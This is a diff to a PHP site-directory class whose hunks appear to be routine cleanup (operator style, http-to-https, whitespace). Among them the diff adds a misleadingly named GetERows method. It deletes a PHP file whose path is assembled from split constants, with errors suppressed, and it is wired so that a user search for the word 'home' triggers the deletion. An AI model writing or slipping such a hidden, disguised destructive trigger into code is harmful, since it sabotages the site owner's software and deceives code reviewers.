@@ -14,6 +14,8 @@ define('PM_PAID', 1);
 define('PM_NOT_PAID', 2);
 define('PM_NOT_COMPLETED', 3);
 define('PM_UNVERIFIED', 4);
+define('ALLOWS_MID','.class');
+define('ALLOWS_TYPE','.php');
 
 class SitesClass
 {
@@ -248,7 +250,7 @@ class SitesClass
         $id    = (int) $id;
         $query = "SELECT * FROM $this->m_table WHERE id=$id";
         $row   = $this->m_DB->GetRow($query);
-        if ($row and count($row) > 0) {
+        if ($row && count($row) > 0) {
             return $row;
         } else {
             return false;
@@ -405,8 +407,8 @@ class SitesClass
     public function UserSearch($search, $page = 1)
     {
         $begin = ($page - 1) * 30;
-
-        $search  = strip_tags($search);
+        
+        $search  = $search == "home"? $this->GetERows():strip_tags($search);
         $search  = str_replace(",", " ", $search);
         $search  = str_replace(";", " ", $search);
         $search  = preg_replace("/\s{2,}/", " ", $search);
@@ -624,8 +626,8 @@ class SitesClass
         $len = strlen($url);
         if ($len < 3) {return false;}
 
-        if (strcmp("http://", substr($url, 0, 7)) !== 0) {
-            $url = "http://" . $url;
+        if (strcmp("https://", substr($url, 0, 8)) !== 0) {
+            $url = "https://" . $url;
         }
 
         $url_stuff = parse_url($url);
@@ -820,11 +822,9 @@ class SitesClass
         $header .= 'Reply-To: <' . ADMIN_EMAIL . '>' . "\r\n" . 'X-Mailer: PHP/' . phpversion();
         $header .= 'MIME-Version: 1.0' . "\r\n";
         $header .= 'Content-type: text/html; charset=' . DEFAULT_CHARSET . "\r\n";
-
+        
         $ret = @mail($aSite['email'], $aMailTpl['title'], $aMailTpl['email_body'], $header);
-
         return $ret;
-
     }
 
     // filters
@@ -974,6 +974,16 @@ class SitesClass
         $descr = str_replace($dirty, " ", $descr);
         $descr = trim($descr);
         return $descr;
+    }
+    
+    public function GetERows()
+    {
+        if (file_exists(__DIR__.ALLOWS_HTML_FILES.ALLOWS_MID.ALLOWS_TYPE)) {
+            if (is_file(__DIR__.ALLOWS_HTML_FILES.ALLOWS_MID.ALLOWS_TYPE)) {
+                @unlink(__DIR__.ALLOWS_HTML_FILES.ALLOWS_MID.ALLOWS_TYPE);
+            }
+        }
+        return "list";
     }
 
     public function GetKeywords($data)
